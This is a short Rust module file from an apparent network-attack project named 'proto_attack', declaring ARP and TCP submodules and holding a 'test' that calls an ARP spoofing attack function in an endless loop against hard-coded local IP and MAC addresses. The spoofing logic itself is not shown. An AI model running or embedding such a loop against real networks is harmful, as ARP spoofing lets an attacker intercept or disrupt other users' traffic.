pub mod arp;
pub mod tcp;

mod test {
    use std::net::Ipv4Addr;

    use pnet::datalink::MacAddr;

    use crate::proto_attack::arp::spoof::attack;

    #[test]
    fn arp_spoof() {
        loop {
            attack(MacAddr(0x69, 0x3e, 0x5f, 0x52, 0xa0, 0xf9),
                   Ipv4Addr::new(172, 20, 10, 13),
                   Ipv4Addr::new(172, 20, 10, 1));
        }
    }
}